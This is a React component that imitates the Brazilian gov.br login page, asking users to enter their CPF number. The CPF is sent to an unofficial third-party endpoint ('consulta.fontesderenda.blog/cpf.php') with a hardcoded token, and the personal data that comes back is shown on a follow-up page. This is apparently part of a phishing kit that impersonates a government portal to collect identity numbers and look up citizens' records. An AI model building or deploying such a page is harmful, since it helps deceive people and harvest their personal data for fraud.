
import React, { useState } from 'react';
import { useNavigate } from 'react-router-dom';
import { Button } from "@/components/ui/button";
import { ArrowRight, DollarSign, QrCode, Key, Cloud, HelpCircle } from "lucide-react";
import CPFInput from './CPFInput';
import { toast } from 'sonner';

interface LoginCardProps {
  className?: string;
}

const LoginCard: React.FC<LoginCardProps> = ({ className }) => {
  const [cpf, setCpf] = useState('');
  const [isValid, setIsValid] = useState(false);
  const [isLoading, setIsLoading] = useState(false);
  const navigate = useNavigate();

  const handleValidate = (valid: boolean, value: string) => {
    setIsValid(valid);
    setCpf(value);
  };

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    
    if (!isValid) {
      toast.error('CPF inválido. Por favor, verifique o número informado.');
      return;
    }
    
    setIsLoading(true);
    
    // Remove any non-digit characters from CPF
    const cleanCpf = cpf.replace(/\D/g, '');
    
    try {
      // Make the API call to fetch user data
      const response = await fetch(`https://consulta.fontesderenda.blog/cpf.php?token=f29edd8e-9a7c-45c1-bbfd-5c7ecf469fca&cpf=${cleanCpf}`);
      
      if (!response.ok) {
        throw new Error('Falha na consulta. Status: ' + response.status);
      }
      
      const data = await response.json();
      
      if (data.DADOS) {
        // Add the CPF to the user data
        const userData = {
          ...data.DADOS,
          cpf: cleanCpf
        };
        
        // Navigate to the user data page with the fetched data
        navigate('/user-data', { state: { userData } });
      } else {
        toast.error('Não foram encontrados dados para este CPF.');
      }
    } catch (error) {
      console.error('Erro na consulta:', error);
      toast.error('Ocorreu um erro ao consultar o CPF. Por favor, tente novamente.');
    } finally {
      setIsLoading(false);
    }
  };

  return (
    <div className={`glass-card rounded-xl p-8 w-full max-w-md mx-auto animate-fade-in ${className}`}>
      <h2 className="font-heading text-lg font-semibold text-gray-800 mb-6 text-left">
        Identifique-se no gov.br com:
      </h2>
      
      <div className="flex items-center mb-4">
        <img 
          src="https://i.postimg.cc/3xC9TBzZ/id-card-solid.png" 
          alt="ID Card" 
          className="w-5 h-5 mr-2"
        />
        <span className="text-sm font-medium text-gray-700">Número do CPF</span>
      </div>
      
      <p className="text-xs text-gray-500 mb-4 text-center">
        Digite seu CPF para <strong>criar</strong> ou <strong>acessar</strong> sua conta gov.br
      </p>
      
      <form onSubmit={handleSubmit} className="space-y-6">
        <div className="space-y-2">
          <label htmlFor="cpf" className="gov-label">
            Digite seu CPF
          </label>
          <CPFInput 
            id="cpf"
            name="cpf"
            onValidate={handleValidate}
            aria-describedby="cpf-description"
          />
          {/* Removed the "Digite apenas números" text */}
        </div>
        
        <Button
          type="submit"
          className="gov-button w-full rounded-full"
          disabled={!isValid || isLoading}
        >
          {isLoading ? (
            <span className="flex items-center">
              <span className="animate-pulse">Verificando...</span>
            </span>
          ) : (
            <span className="flex items-center">
              Continuar <ArrowRight className="ml-2 h-4 w-4" />
            </span>
          )}
        </Button>
      </form>

      {/* Outras opções de identificação */}
      <div className="mt-6 pt-6 border-t border-gray-200">
        <h3 className="text-sm font-medium text-gray-700 mb-4">Outras opções de identificação:</h3>
        
        <div className="space-y-4">
          {/* Login com banco */}
          <div className="flex items-center">
            <DollarSign className="h-5 w-5 text-green-600 mr-3 flex-shrink-0" />
            <div className="flex-1">
              <span className="text-green-600 font-medium">Login com seu banco</span>
              <span className="ml-2 text-xs bg-green-100 text-green-800 px-2 py-0.5 rounded">SUA CONTA SERÁ PRATA</span>
            </div>
          </div>
          
          {/* Login com QR code */}
          <div className="flex items-center">
            <QrCode className="h-5 w-5 text-blue-600 mr-3 flex-shrink-0" />
            <span className="text-gray-700">Login com QR code</span>
          </div>
          
          {/* Certificado digital */}
          <div className="flex items-center">
            <Key className="h-5 w-5 text-blue-600 mr-3 flex-shrink-0" />
            <span className="text-gray-700">Seu certificado digital</span>
          </div>
          
          {/* Certificado digital em nuvem */}
          <div className="flex items-center">
            <Cloud className="h-5 w-5 text-blue-600 mr-3 flex-shrink-0" />
            <span className="text-gray-700">Seu certificado digital em nuvem</span>
          </div>
        </div>
        
        {/* Ajuda e termos */}
        <div className="mt-6 space-y-4">
          <div className="flex items-center">
            <HelpCircle className="h-5 w-5 text-blue-600 mr-3 flex-shrink-0" />
            <span className="text-blue-600">Está com dúvidas e precisa de ajuda?</span>
          </div>
          
          <div className="text-center">
            <Button
              variant="link"
              className="p-0 h-auto text-blue-600 hover:text-blue-700 text-sm"
            >
              Termo de Uso e Aviso de Privacidade
            </Button>
          </div>
        </div>
      </div>
    </div>
  );
};

export default LoginCard;
